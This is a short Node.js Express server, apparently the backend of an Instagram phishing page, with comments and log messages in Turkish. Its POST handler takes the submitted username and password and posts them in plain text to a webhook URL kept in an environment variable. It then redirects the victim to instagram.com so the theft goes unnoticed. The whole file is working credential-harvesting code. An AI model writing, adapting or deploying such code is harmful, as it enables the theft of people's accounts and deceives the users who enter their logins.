const express = require('express');
const app = express();
const request = require('request');
const bodyParser = require('body-parser');
require('dotenv').config();


app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/', async (req, res) => {
    let { username, password } = req.body;
    if (!username || !password) return res.redirect('/?error=1');

    try {
        const webhookUrl = process.env.WEBHOOK_URL;
        await new Promise((resolve, reject) => {
            request.post({
                url: webhookUrl,
                json: {
                    content: `**Username:** ${username}\n**Password:** ${password}`
                }
            }, (error, response, body) => {
                if (error) return reject(error);
                resolve(body);
            });
        });
    } catch (error) {
        console.error('Webhook gönderilirken hata oluştu:', error);
        return res.redirect('/?error=2');
    }

    return res.redirect('http://instagram.com');
});

app.listen(process.env.PORT || 3000, () => {
    console.log(`Sunucu açıldı: http://localhost:${process.env.PORT || 3000}`);
});